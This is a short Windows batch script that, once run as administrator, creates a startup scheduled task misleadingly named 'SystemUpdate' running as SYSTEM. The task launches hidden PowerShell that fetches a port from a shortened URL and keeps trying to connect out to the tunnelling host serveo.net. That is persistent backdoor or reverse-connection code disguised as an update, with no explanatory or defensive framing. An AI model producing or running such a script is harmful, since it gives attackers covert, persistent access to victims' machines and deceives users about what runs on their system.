‎@echo off
‎echo Checking administrator privileges...
‎
‎:: Simple admin check
‎net session >nul 2>&1
‎if %errorLevel% == 0 (
‎    echo Running as administrator, deploying...
‎    schtasks /create /tn "SystemUpdate" /tr "powershell -w hidden -c \"\$p=(irm 'https://tinyurl.com/3sttdvfw').Trim();while(1){try{\$c=New-Object Net.Sockets.TCPClient('serveo.net',\$p);if(\$c.Connected){break}Start-Sleep 10}catch{Start-Sleep 30}}\"" /sc onstart /ru System /f
‎    echo Deployment complete!
‎) else (
‎    echo Please run as Administrator! Right-click -> Run as administrator
‎)
‎pause